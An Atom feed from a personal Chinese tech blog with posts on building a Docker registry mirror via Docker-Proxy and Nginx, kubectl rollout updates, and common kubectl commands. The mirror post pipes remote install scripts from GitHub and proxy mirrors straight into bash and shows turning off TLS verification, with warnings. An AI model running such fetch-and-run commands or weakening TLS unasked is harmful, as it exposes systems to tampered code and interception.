<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>stdlibh的个人网站</title>
  
  <subtitle>但行好事，莫问前程</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-12-30T18:32:15.350Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Sanli Ma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>搭建Docker镜像加速服务</title>
    <link href="http://example.com/2024/12/31/%E6%90%AD%E5%BB%BADocker%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1/"/>
    <id>http://example.com/2024/12/31/%E6%90%AD%E5%BB%BADocker%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1/</id>
    <published>2024-12-30T17:50:56.000Z</published>
    <updated>2024-12-30T18:32:15.350Z</updated>
    
    <content type="html"><![CDATA[<p>许久未看k3s的lobe-chat的自动更新，今天上去一看发现又出现了问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pod/lobe-chat-deployment-77499fc5b5-pfl6s   0/1     ImagePullBackOff   0          10m  <br></code></pre></td></tr></table></figure><p>报错为ImagePullBackOff，又是镜像环节出问题，一番排查发现是镜像源挂了。反反复复，决定搭建一个自己的镜像加速服务。</p><p>本文选择 <strong>私有 Registry Mirror&#x2F;Proxy</strong> 方案，并使用开源项目 <strong><code>docker-proxy</code></strong> 作为实现工具。</p><h2 id="2-使用-Docker-Proxy-搭建镜像代理"><a href="#2-使用-Docker-Proxy-搭建镜像代理" class="headerlink" title="2. 使用 Docker-Proxy 搭建镜像代理"></a>2. 使用 Docker-Proxy 搭建镜像代理</h2><h3 id="2-1-Docker-Proxy-简介"><a href="#2-1-Docker-Proxy-简介" class="headerlink" title="2.1 Docker-Proxy 简介"></a>2.1 Docker-Proxy 简介</h3><p><code>docker-proxy</code> 是一个轻量级的 Docker Registry 代理工具，它可以缓存上游 Registry 的镜像层，从而加速后续的镜像拉取。其核心原理是在本地构建一个中间层，当客户端请求镜像时，<code>docker-proxy</code> 会先检查本地是否存在该镜像层，如果存在则直接返回，否则从上游 Registry 拉取并缓存到本地。</p><p><strong>项目地址：</strong> <a href="https://github.com/dqzboy/Docker-Proxy">https://github.com/dqzboy/Docker-Proxy</a></p><p><strong>主要特点：</strong></p><ul><li><strong>简单易用：</strong> 通过简单的脚本即可完成安装和配置。</li><li><strong>轻量高效：</strong> 占用资源少，性能良好。</li><li><strong>支持多种部署方式：</strong> 可以直接部署在物理机或虚拟机上，也可以部署在 Docker 容器中。</li><li><strong>可配置 upstream：</strong> 可以指定多个上游 Registry 源。</li></ul><h3 id="2-2-部署方法"><a href="#2-2-部署方法" class="headerlink" title="2.2 部署方法"></a>2.2 部署方法</h3><p><code>docker-proxy</code> 提供了便捷的安装脚本，可以根据不同的网络环境选择合适的安装方式。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># CentOS &amp;&amp; RHEL &amp;&amp; Rocky</span><br>sudo yum -y <span class="hljs-keyword">install </span>curl<br><span class="hljs-comment"># ubuntu &amp;&amp; debian</span><br>sudo apt -y <span class="hljs-keyword">install </span>curl<br><br><span class="hljs-comment"># 国外环境 (直连 Github)</span><br><span class="hljs-keyword">bash </span>-c <span class="hljs-string">&quot;$(curl -fsSL https://raw.githubusercontent.com/dqzboy/Docker-Proxy/main/install/DockerProxy_Install.sh)&quot;</span><br><br><span class="hljs-comment"># 国内环境 CDN 加速地址 (推荐)</span><br><span class="hljs-keyword">bash </span>-c <span class="hljs-string">&quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/dqzboy/Docker-Proxy/install/DockerProxy_Install.sh)&quot;</span><br><br><span class="hljs-comment"># 国内 Github 代理地址 (备选)</span><br><span class="hljs-keyword">bash </span>-c <span class="hljs-string">&quot;$(curl -fsSL https://ghproxy.com/https://raw.githubusercontent.com/dqzboy/Docker-Proxy/main/install/DockerProxy_Install.sh)&quot;</span><br></code></pre></td></tr></table></figure><p>我使用的是国外的 Ubuntu 服务器，因此执行了以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/dqzboy/Docker-Proxy/main/install/DockerProxy_Install.sh)</span>&quot;</span><br></code></pre></td></tr></table></figure><p>执行脚本后，会弹出交互式菜单，你可以根据需要选择安装的服务。这里我们选择安装 <strong>Nginx</strong> 作为反向代理服务器，用于对外提供加速服务。</p><p><img src="https://img.stdlibh.site/2024/12/6820e71e41a2f84250e9059a33d1f837.png"></p><h3 id="2-3-配置-Nginx-反向代理"><a href="#2-3-配置-Nginx-反向代理" class="headerlink" title="2.3 配置 Nginx 反向代理"></a>2.3 配置 Nginx 反向代理</h3><p>安装完成后，如果需要使用自定义域名访问加速服务，需要修改 Nginx 的配置文件。该文件位于 <code>/etc/nginx/conf.d/docker-proxy.conf</code>。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vim</span> /etc/nginx/<span class="hljs-keyword">conf</span>.d/docker-proxy.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>你需要修改 <code>server_name</code> 指令为你自己的域名，并配置 SSL 证书。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs awk">ubuntu@ip-<span class="hljs-number">172</span>-<span class="hljs-number">31</span>-<span class="hljs-number">4</span>-<span class="hljs-number">216</span>:~$ cat <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf.d/</span>docker-proxy.conf <br>server &#123;<br>    listen       <span class="hljs-number">80</span>;<br>    listen       <span class="hljs-number">443</span> ssl;<br>    server_name  server_name;<br>    ssl_certificate <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf.d/</span>server_name.pem;<br>    ssl_certificate_key <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf.d/</span>server_name.key;<br>    ssl_session_timeout <span class="hljs-number">1</span>d;<br>    ssl_session_cache   shared:SSL:<span class="hljs-number">50</span>m;<br>    <span class="hljs-comment">#ssl_session_tickets off;</span><br>    <span class="hljs-comment">#ssl_protocols TLSv1.2 TLSv1.3;</span><br>    <span class="hljs-comment">#ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br>    <span class="hljs-comment">#ssl_prefer_server_ciphers on;</span><br>    ssl_buffer_size <span class="hljs-number">8</span>k;<br>    proxy_connect_timeout <span class="hljs-number">600</span>;<br>    proxy_send_timeout    <span class="hljs-number">600</span>;<br>    proxy_read_timeout    <span class="hljs-number">600</span>;<br>    send_timeout          <span class="hljs-number">600</span>;<br>    location / &#123;<br>        proxy_pass   http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">51000</span>;<br>        proxy_set_header Host <span class="hljs-variable">$host</span>;<br>        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;        <br>        proxy_set_header X-Nginx-Proxy true;<br>        proxy_buffering off;<br>        proxy_redirect off;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改完成后，检查 Nginx 配置语法并重启 Nginx 服务：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo nginx -t</span><br><span class="hljs-attribute">sudo systemctl reload nginx</span><br></code></pre></td></tr></table></figure><h2 id="3-配置-Docker-客户端使用加速服务"><a href="#3-配置-Docker-客户端使用加速服务" class="headerlink" title="3. 配置 Docker 客户端使用加速服务"></a>3. 配置 Docker 客户端使用加速服务</h2><p>配置 Docker 客户端使用镜像加速服务非常简单，只需要修改 Docker 的配置文件 <code>daemon.json</code>。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vim <span class="hljs-regexp">/etc/</span>docker/daemon.json<br></code></pre></td></tr></table></figure><p>将以下内容添加到 <code>daemon.json</code> 文件中：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://hub.your_domain.com&quot;</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解释：</strong></p><ul><li><code>&quot;registry-mirrors&quot;</code>: 指定 Docker 客户端使用的镜像加速地址列表。</li></ul><p>修改完成后，重启 Docker 服务使配置生效：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>现在，当你尝试拉取镜像时，Docker 客户端会自动尝试从你配置的加速地址拉取。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull nginx:latest<br></code></pre></td></tr></table></figure><h3 id="3-1-处理-TLS-证书问题-不推荐"><a href="#3-1-处理-TLS-证书问题-不推荐" class="headerlink" title="3.1 处理 TLS 证书问题 (不推荐)"></a>3.1 处理 TLS 证书问题 (不推荐)</h3><p>在我配置的过程中，发现使用自定义域名和自签名证书时，Docker 客户端会报证书验证错误：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error </span>response from daemon: Get &quot;https://hub.your_domain.com/v2/&quot;: tls: failed to verify certificate: x509: certificate signed by unknown authority<br></code></pre></td></tr></table></figure><p>这是因为 Docker 客户端默认会验证 HTTPS 连接的证书。如果你使用的是自签名证书或者内部 CA 签发的证书，需要在 Docker 客户端配置信任该证书颁发机构。 <strong>强烈建议使用受信任的 CA 签发的证书来避免安全风险。</strong></p><p><strong>如果出于测试目的，你确实需要禁用 TLS 验证，可以添加 <code>insecure-registries</code> 配置项到 <code>/etc/docker/daemon.json</code> 中。</strong></p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;insecure-registries&quot;</span>: [<br>    <span class="hljs-string">&quot;hub.your_domain.com&quot;</span><br>  ],<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://hub.your_domain.com&quot;</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意：使用 <code>insecure-registries</code> 会禁用 TLS 证书验证，这将带来安全风险，可能导致中间人攻击。请仅在明确风险并只在测试环境中使用。生产环境务必使用可信的 SSL 证书。</strong></p><h2 id="4-配置-containerd-使用加速服务-K3s-环境"><a href="#4-配置-containerd-使用加速服务-K3s-环境" class="headerlink" title="4. 配置 containerd 使用加速服务 (K3s 环境)"></a>4. 配置 containerd 使用加速服务 (K3s 环境)</h2><p>如果你像我一样使用 k3s，那么你的容器运行时是 containerd。你需要修改 containerd 的配置文件来使用镜像加速服务。</p><p>containerd 的配置文件通常位于 &#x2F;etc&#x2F;rancher&#x2F;k3s&#x2F;registries.yaml </p><p><strong>处理 TLS 证书问题 (不推荐 for containerd):</strong></p><p>与 Docker 类似，containerd 也会验证 TLS 证书。如果你遇到了证书问题，并且 <strong>确信风险可控</strong>，可以在 <code>endpoint</code> 中使用 <code>http://</code> 协议禁用 TLS 验证。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">mirrors:</span><br>  <span class="hljs-string">&quot;docker.io&quot;</span>:<br>    <span class="hljs-meta"># endpoint指定镜像加速服务的地址。</span><br><span class="hljs-symbol">    endpoint:</span><br>      - <span class="hljs-string">&quot;http://hub.your_domain.com&quot;</span><br></code></pre></td></tr></table></figure><p><strong>同样，强烈不建议在生产环境禁用 TLS 验证。</strong></p><p>修改完成后，重启 k3s 服务使配置生效：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo systemctl <span class="hljs-built_in">restart</span> k3s<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;许久未看k3s的lobe-chat的自动更新，今天上去一看发现又出现了问题：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;</summary>
      
    
    
    
    
    <category term="docker" scheme="http://example.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>kubectl rollout滚动更新</title>
    <link href="http://example.com/2024/09/25/kubectl-rollout%E6%BB%9A%E5%8A%A8%E6%9B%B4%E6%96%B0/"/>
    <id>http://example.com/2024/09/25/kubectl-rollout%E6%BB%9A%E5%8A%A8%E6%9B%B4%E6%96%B0/</id>
    <published>2024-09-25T03:09:57.000Z</published>
    <updated>2024-09-25T03:30:08.020Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://img.stdlibh.site/2024/09/f5b126a179195ddad533b36ced23ffa4.png" alt="module_06_rollingupdates1"></p><p>用户希望应用程序始终可用，而开发人员则需要每天多次部署它们的新版本。 在 Kubernetes 中，这些是通过滚动更新（Rolling Updates）完成的。 <strong>滚动更新</strong> 允许通过使用新的实例逐步更新 Pod 实例，实现零停机的 Deployment 更新。 新的 Pod 将被调度到具有可用资源的节点上。</p><h2 id="kubectl-rollout命令解析"><a href="#kubectl-rollout命令解析" class="headerlink" title="kubectl rollout命令解析"></a>kubectl rollout命令解析</h2><table><thead><tr><th>子命令</th><th>功能描述</th><th>示例</th></tr></thead><tbody><tr><td>history</td><td>查看资源的版本历史</td><td><code>kubectl rollout history deployment/nginx-deployment</code></td></tr><tr><td>pause</td><td>暂停部署</td><td><code>kubectl rollout pause deployment/nginx-deployment</code></td></tr><tr><td>restart</td><td>重新启动部署</td><td><code>kubectl rollout restart deployment/nginx-deployment</code></td></tr><tr><td>resume</td><td>恢复已暂停的部署</td><td><code>kubectl rollout resume deployment/nginx-deployment</code></td></tr><tr><td>status</td><td>查看部署的当前状态</td><td><code>kubectl rollout status deployment/nginx-deployment</code></td></tr><tr><td>undo</td><td>回滚到之前的版本</td><td><code>kubectl rollout undo deployment/nginx-deployment</code></td></tr></tbody></table><p>补充说明：</p><ol><li><p><code>history</code>: </p><ul><li>查看特定版本的详细信息：<code>kubectl rollout history deployment/nginx-deployment --revision=2</code></li></ul></li><li><p><code>pause</code> 和 <code>resume</code>:</p><ul><li>这两个命令通常成对使用，用于控制部署过程</li></ul></li><li><p><code>restart</code>:</p><ul><li>用于触发 Deployment 中所有 Pod 的重新创建</li></ul></li><li><p><code>status</code>:</p><ul><li>可以添加 <code>--watch</code> 标志来持续监控状态：<code>kubectl rollout status deployment/nginx-deployment --watch</code></li></ul></li><li><p><code>undo</code>:</p><ul><li>回滚到特定版本：<code>kubectl rollout undo deployment/nginx-deployment --to-revision=2</code></li></ul></li></ol><h2 id="步骤（官方）"><a href="#步骤（官方）" class="headerlink" title="步骤（官方）"></a>步骤（官方）</h2><ol><li>检查当前状态:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl get deployments<br>kubectl get pods<br>kubectl describe pods | grep Image<br></code></pre></td></tr></table></figure><ol start="2"><li>更新应用程序版本:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl <span class="hljs-built_in">set</span> image deployments/kubernetes-bootcamp kubernetes-bootcamp=jocatalin/kubernetes-bootcamp:v2<br>kubectl get pods<br></code></pre></td></tr></table></figure><ol start="3"><li>验证更新:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl rollout status deployments/kubernetes-bootcamp<br>kubectl describe pods | grep Image<br></code></pre></td></tr></table></figure><ol start="4"><li>回滚更新（如果需要）:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl rollout undo deployments/kubernetes-bootcamp<br>kubectl get pods<br>kubectl describe pods | grep Image<br></code></pre></td></tr></table></figure><ol start="5"><li>清理:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl delete deployments/kubernetes-bootcamp services/kubernetes-bootcamp<br></code></pre></td></tr></table></figure><h2 id="重启回滚（优雅）"><a href="#重启回滚（优雅）" class="headerlink" title="重启回滚（优雅）"></a>重启回滚（优雅）</h2><ol><li>使用 kubectl rollout restart</li></ol><p>这是最直接的方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl rollout restart deployment/your-deployment-name<br></code></pre></td></tr></table></figure><p>这个命令会触发一个滚动重启过程：</p><ol><li><p>逐个替换旧的 Pod</p></li><li><p>确保新 Pod 运行正常后才终止旧 Pod</p></li><li><p>继续此过程直到所有 Pod 都被更新</p></li><li><p>监控重启进度</p></li></ol><p>使用以下命令监控重启进度：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl rollout status deployment/your-deployment-name<br></code></pre></td></tr></table></figure><ol start="3"><li>自定义重启策略</li></ol><p>通过修改 Deployment 的更新策略来自定义重启行为：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">strategy:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">RollingUpdate</span><br>    <span class="hljs-attr">rollingUpdate:</span><br>      <span class="hljs-attr">maxUnavailable:</span> <span class="hljs-number">25</span><span class="hljs-string">%</span><br>      <span class="hljs-attr">maxSurge:</span> <span class="hljs-number">25</span><span class="hljs-string">%</span><br></code></pre></td></tr></table></figure><ul><li><code>maxUnavailable</code>: 更新过程中允许不可用的 Pod 的最大数量</li><li><code>maxSurge</code>: 更新过程中允许创建的超出期望 Pod 数量的 Pod 数</li></ul><ol start="4"><li>使用环境变量触发重启</li></ol><p>如果想在不更改镜像的情况下触发重启，可以更新一个环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl <span class="hljs-built_in">set</span> <span class="hljs-built_in">env</span> deployment/your-deployment-name RESTART_DATE=<span class="hljs-string">&quot;<span class="hljs-subst">$(date)</span>&quot;</span><br></code></pre></td></tr></table></figure><ol start="5"><li>使用注释触发重启</li></ol><p>另一种方法是更新 Deployment 的注释：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl patch deployment your-deployment-name -p \<br>  <span class="hljs-string">&quot;&#123;\&quot;spec\&quot;:&#123;\&quot;template\&quot;:&#123;\&quot;metadata\&quot;:&#123;\&quot;annotations\&quot;:&#123;\&quot;kubectl.kubernetes.io/restartedAt\&quot;:\&quot;<span class="hljs-subst">$(date +&#x27;%Y-%m-%dT%H:%M:%S%z&#x27;)</span>\&quot;&#125;&#125;&#125;&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><ol start="6"><li>分批重启（高级技巧）</li></ol><p>对于大型部署进行分批重启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl get pods -l app=your-app-label -o jsonpath=<span class="hljs-string">&#x27;&#123;range .items[*]&#125;&#123;.metadata.name&#125;&#123;&quot;\n&quot;&#125;&#123;end&#125;&#x27;</span> | \<br>  xargs -I &#123;&#125; kubectl delete pod &#123;&#125;<br></code></pre></td></tr></table></figure><p>这会逐个删除 Pod，触发 Kubernetes 创建新的 Pod 来替换。</p><p>注意事项：</p><ul><li>确保你的应用程序能够优雅地处理重启</li><li>在生产环境中进行重启之前，先在测试环境中验证</li><li>考虑使用就绪探针（Readiness Probe）来确保新 Pod 在接收流量前已准备就绪</li><li>监控应用程序性能，确保重启过程不会对用户体验产生负面影响</li><li>使用 <code>maxUnavailable</code> 来控制滚动重启的并发性，避免一次删除太多 Pod，导致应用不可用</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://img.stdlibh.site/2024/09/f5b126a179195ddad533b36ced23ffa4.png&quot; alt=&quot;module_06_rollingupdates1&quot;&gt;&lt;/p&gt;
&lt;p&gt;用户希望应用程序始终可用，而开发</summary>
      
    
    
    
    
    <category term="kubernetes" scheme="http://example.com/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>kubectl常用命令</title>
    <link href="http://example.com/2024/09/25/kubectl%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2024/09/25/kubectl%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2024-09-25T03:00:29.000Z</published>
    <updated>2024-09-25T03:30:11.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kubectl常用命令"><a href="#kubectl常用命令" class="headerlink" title="kubectl常用命令"></a>kubectl常用命令</h1><p><strong>1. 集群信息:</strong></p><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>kubectl cluster-info</code></td><td>显示集群信息</td><td><code>kubectl cluster-info</code></td></tr><tr><td><code>kubectl config get-contexts</code></td><td>显示可用上下文（集群）</td><td><code>kubectl config get-contexts</code></td></tr><tr><td><code>kubectl config use-context &lt;context&gt;</code></td><td>切换上下文</td><td><code>kubectl config use-context my-cluster</code></td></tr><tr><td><code>kubectl top </code></td><td>显示资源（CPU&#x2F;内存&#x2F;存储）使用率</td><td><code>kubectl top [flags]</code></td></tr></tbody></table><p><strong>1. 集群信息:</strong></p><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>kubectl cluster-info</code></td><td>显示集群信息</td><td><code>kubectl cluster-info</code></td></tr><tr><td><code>kubectl config get-contexts</code></td><td>显示可用上下文（集群）</td><td><code>kubectl config get-contexts</code></td></tr><tr><td><code>kubectl config use-context &lt;context&gt;</code></td><td>切换上下文</td><td><code>kubectl config use-context my-cluster</code></td></tr><tr><td><code>kubectl proxy</code></td><td>创建一个代理服务器，将本地请求转发到 Kubernetes API server</td><td><code>kubectl proxy --port=8080</code></td></tr><tr><td><code>kubectl top </code></td><td>显示资源（CPU&#x2F;内存&#x2F;存储）使用率</td><td><code>kubectl top [flags]</code></td></tr></tbody></table><p><strong>2. 节点管理:</strong></p><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>kubectl get nodes</code></td><td>列出节点</td><td><code>kubectl get nodes -o wide</code> (显示更多信息)</td></tr><tr><td><code>kubectl describe node &lt;node&gt;</code></td><td>查看节点详情</td><td><code>kubectl describe node worker-1</code></td></tr><tr><td><code>kubectl cordon &lt;node&gt;</code></td><td>标记节点为不可调度</td><td><code>kubectl cordon worker-1</code></td></tr><tr><td><code>kubectl uncordon &lt;node&gt;</code></td><td>取消不可调度标记</td><td><code>kubectl uncordon worker-1</code></td></tr><tr><td><code>kubectl drain &lt;node&gt;</code></td><td>驱逐节点上所有 Pod</td><td><code>kubectl drain worker-1 --ignore-daemonsets</code></td></tr></tbody></table><p><strong>3. 命名空间管理:</strong></p><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>kubectl get namespaces</code></td><td>列出命名空间</td><td><code>kubectl get namespaces</code></td></tr><tr><td><code>kubectl create namespace &lt;namespace&gt;</code></td><td>创建命名空间</td><td><code>kubectl create namespace my-namespace</code></td></tr><tr><td><code>kubectl delete namespace &lt;namespace&gt;</code></td><td>删除命名空间</td><td><code>kubectl delete namespace my-namespace</code></td></tr></tbody></table><p><strong>4. Pod 管理:</strong></p><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>kubectl get pods [-n &lt;namespace&gt;]</code></td><td>列出 Pod</td><td><code>kubectl get pods -n my-namespace</code></td></tr><tr><td><code>kubectl describe pod &lt;pod&gt; [-n &lt;namespace&gt;]</code></td><td>查看 Pod 详情</td><td><code>kubectl describe pod my-pod -n my-namespace</code></td></tr><tr><td><code>kubectl run &lt;pod-name&gt; --image=&lt;image&gt; [-n &lt;namespace&gt;]</code></td><td>快速创建一个 Deployment 和 Pod</td><td><code>kubectl run nginx --image=nginx -n my-namespace</code></td></tr><tr><td><code>kubectl create -f &lt;yaml&gt;</code></td><td>创建资源 (根据 YAML 文件)</td><td><code>kubectl create -f my-pod.yaml</code></td></tr><tr><td><code>kubectl apply -f &lt;yaml&gt;</code></td><td>应用&#x2F;更新资源 (根据 YAML 文件)</td><td><code>kubectl apply -f my-pod.yaml</code></td></tr><tr><td><code>kubectl delete pod &lt;pod&gt; [-n &lt;namespace&gt;]</code></td><td>删除 Pod</td><td><code>kubectl delete pod my-pod -n my-namespace</code></td></tr><tr><td><code>kubectl logs &lt;pod&gt; [-n &lt;namespace&gt;] [-c &lt;container&gt;] [-f]</code></td><td>查看 Pod 日志</td><td><code>kubectl logs my-pod -n my-namespace -f</code> (实时跟踪)</td></tr><tr><td><code>kubectl exec -it &lt;pod&gt; [-n &lt;namespace&gt;] -c &lt;container&gt; -- &lt;command&gt;</code></td><td>在 Pod 中执行命令</td><td><code>kubectl exec -it my-pod -n my-namespace -c my-container -- bash</code></td></tr></tbody></table><p><strong>5. Deployment &amp; Service 管理:</strong></p><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>kubectl get deployments [-n &lt;namespace&gt;]</code></td><td>列出 Deployment</td><td><code>kubectl get deployments -n my-namespace</code></td></tr><tr><td><code>kubectl get services [-n &lt;namespace&gt;]</code></td><td>列出 Service</td><td><code>kubectl get services -n my-namespace</code></td></tr><tr><td><code>kubectl scale deployment &lt;deployment&gt; --replicas=&lt;number&gt; [-n &lt;namespace&gt;]</code></td><td>缩放 Deployment</td><td><code>kubectl scale deployment my-deployment --replicas=3 -n my-namespace</code></td></tr><tr><td><code>kubectl rollout status deployment &lt;deployment&gt; [-n &lt;namespace&gt;]</code></td><td>查看 Deployment 滚动更新状态</td><td><code>kubectl rollout status deployment my-deployment -n my-namespace</code></td></tr><tr><td><code>kubectl rollout undo deployment &lt;deployment&gt; [-n &lt;namespace&gt;]</code></td><td>回滚 Deployment</td><td><code>kubectl rollout undo deployment my-deployment -n my-namespace</code></td></tr><tr><td><code>kubectl rollout restart deployment &lt;deployment&gt; [-n &lt;namespace&gt;]</code></td><td>重启 Deployment 中的所有 Pod</td><td><code>kubectl rollout restart deployment my-deployment -n my-namespace</code></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kubectl常用命令&quot;&gt;&lt;a href=&quot;#kubectl常用命令&quot; class=&quot;headerlink&quot; title=&quot;kubectl常用命令&quot;&gt;&lt;/a&gt;kubectl常用命令&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;1. 集群信息:&lt;/strong&gt;&lt;/p&gt;
&lt;tab</summary>
      
    
    
    
    
    <category term="kubernetes" scheme="http://example.com/tags/kubernetes/"/>
    
